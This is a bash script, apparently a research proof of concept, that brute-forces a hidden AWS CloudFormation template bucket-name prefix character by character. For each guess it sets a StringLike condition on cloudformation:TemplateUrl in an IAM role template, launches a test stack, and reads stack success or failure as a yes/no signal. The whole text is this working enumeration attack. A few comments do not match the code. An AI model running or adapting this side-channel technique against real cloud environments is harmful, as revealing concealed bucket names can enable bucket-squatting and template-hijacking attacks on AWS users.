BUCKET_NAME=cfn-test-conditions
REGION=us-east-1
AWS_ACCOUNT_ID=1234567890
AWS_RESERVED_TEMPLATE_URL_PREFIX=executor-templates

# Read the conditions.json file
conditions_file="conditions.json"
if [[ ! -f $conditions_file ]]; then
    echo "$conditions_file not found!"
    exit 1
fi

replace_file="roles.json.template"
if [[ ! -f $replace_file ]]; then
    echo "$replace_file not found!"
    exit 1
fi

current_condition="{\"StringLike\":{\"cloudformation:TemplateUrl\":\"https://${AWS_RESERVED_TEMPLATE_URL_PREFIX}-\$guess*-${REGION}.s3.${REGION}.amazonaws.com/*${AWS_ACCOUNT_ID}*\"}}"
sed "s|\$replace|$current_condition|g" $replace_file > "_guess.json.template"

prefix=""
alphabet=( {0..9} - {a..z} )
index=0

while [ $index -lt ${#alphabet[@]} ]; do
    c="${alphabet[$index]}"
    guess="${prefix}${c}"
    sed "s|\$guess|$guess|g" "_guess.json.template" > "_guess.json"

    aws s3 cp --profile "${AWS_PROFILE}" _guess.json s3://cfn-test-conditions/cloudformation/test/roles.json
    aws s3 cp --profile "${AWS_PROFILE}" substack.json s3://cfn-test-conditions/cloudformation/test/substack.json
    aws cloudformation create-stack --profile "${AWS_PROFILE}" --region "${REGION}" \
        --capabilities CAPABILITY_NAMED_IAM CAPABILITY_AUTO_EXPAND \
        --disable-rollback \
        --stack-name cfn-test-guess-$guess-1 --template-body file://input.json > _guess_output.json
    echo "[$guess] Stack creation started. Waiting for status..."

    # Extract StackId from the _output.json
    stack_id=$(jq -r '.StackId' _guess_output.json)
    while true; do
        # Fetch the current status of the stack
        status=$(aws cloudformation describe-stacks --profile "${AWS_PROFILE}" --region "${REGION}" --stack-name $stack_id | jq -r '.Stacks[0].StackStatus')
        case $status in
            CREATE_COMPLETE)
                echo "[$guess] Stack creation succeeded! Deleting stack..."
                prefix="${guess}"
                index=0
                break # exit the while loop
                ;;
            CREATE_FAILED|ROLLBACK_COMPLETE|ROLLBACK_FAILED)
                echo "[$guess] Stack creation failed. Deleting stack..."
                index=$((index + 1))
                break # exit the while loop
                ;;
            *) # For other statuses like CREATE_IN_PROGRESS, just wait and poll again
                sleep 10 # wait for 30 seconds before checking again
                ;;
        esac
    done

    aws cloudformation delete-stack --profile "${AWS_PROFILE}" --region "${REGION}" --stack-name $stack_id
    sleep 10
    echo "[$guess] ====END===="
done

echo "Result $prefix"